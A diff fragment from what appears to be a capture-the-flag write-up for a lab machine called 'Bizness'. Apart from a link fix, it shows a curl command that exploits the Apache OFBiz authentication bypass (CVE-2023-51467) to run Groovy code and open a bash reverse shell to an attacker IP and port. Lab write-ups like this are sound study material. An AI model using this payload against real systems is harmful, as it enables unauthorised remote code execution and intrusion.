@@ -136,7 +136,7 @@ The underlying Apache OFBiz version of the logi page is 18.12. This version is s
 
 ![img-description](3.jpg)
 
-we craft our payload to get a reverse shell as stated in this [Article]((https://vulncheck.com/blog/ofbiz-cve-2023-51467))
+we craft our payload to get a reverse shell as stated in this [Article](https://vulncheck.com/blog/ofbiz-cve-2023-51467)
 
 ```shell
 curl -kv -H "Host: bizness.htb" -d "groovyProgram=x=new String[3];x[0]='bash';x[1]='-c';x[2]='bash -i >%26 /dev/tcp/10.10.16.35:4444 0>%261;';x.execute();" "https://bizness.htb/webtools/control/ProgramExport/?requirePasswordChange=Y&PASSWORD=lobster&USERNAME=albino"
